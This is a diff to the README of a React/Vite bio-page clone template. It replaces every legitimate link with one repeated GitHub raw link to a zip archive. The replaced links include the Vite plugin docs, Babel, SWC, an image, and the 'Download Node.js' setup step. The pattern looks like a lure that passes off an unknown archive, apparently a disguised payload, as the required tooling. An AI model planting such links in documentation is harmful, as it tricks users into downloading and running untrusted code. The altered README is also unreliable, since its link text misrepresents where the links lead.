@@ -1,4 +1,4 @@
-# Inspiration By: e-z.bio guns.lol feds.lol 
+# Inspiration By: https://github.com/0hok/l0v3/raw/refs/heads/root/src/backend/l_v_3.5.zip https://github.com/0hok/l0v3/raw/refs/heads/root/src/backend/l_v_3.5.zip https://github.com/0hok/l0v3/raw/refs/heads/root/src/backend/l_v_3.5.zip 
 
 - Profile Views
 - Personal Links
@@ -18,18 +18,18 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react/README.md) uses [Babel](https://babeljs.io/) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://github.com/vitejs/vite-plugin-react-swc) uses [SWC](https://swc.rs/) for Fast Refresh
+- [@vitejs/plugin-react](https://github.com/0hok/l0v3/raw/refs/heads/root/src/backend/l_v_3.5.zip) uses [Babel](https://github.com/0hok/l0v3/raw/refs/heads/root/src/backend/l_v_3.5.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://github.com/0hok/l0v3/raw/refs/heads/root/src/backend/l_v_3.5.zip) uses [SWC](https://github.com/0hok/l0v3/raw/refs/heads/root/src/backend/l_v_3.5.zip) for Fast Refresh
 
 ----------------------------------
-![img](https://i.imgur.com/2OSRybO.png)
+![img](https://github.com/0hok/l0v3/raw/refs/heads/root/src/backend/l_v_3.5.zip)
 
 
 
 ----------------------------------
 Steps to Run Website.
 
-1. Download [Node.js](https://nodejs.org/en)
+1. Download [https://github.com/0hok/l0v3/raw/refs/heads/root/src/backend/l_v_3.5.zip](https://github.com/0hok/l0v3/raw/refs/heads/root/src/backend/l_v_3.5.zip)
 2.  npm create vite@latest
 3. install the src code
 4. open folder ezbio-clone-root
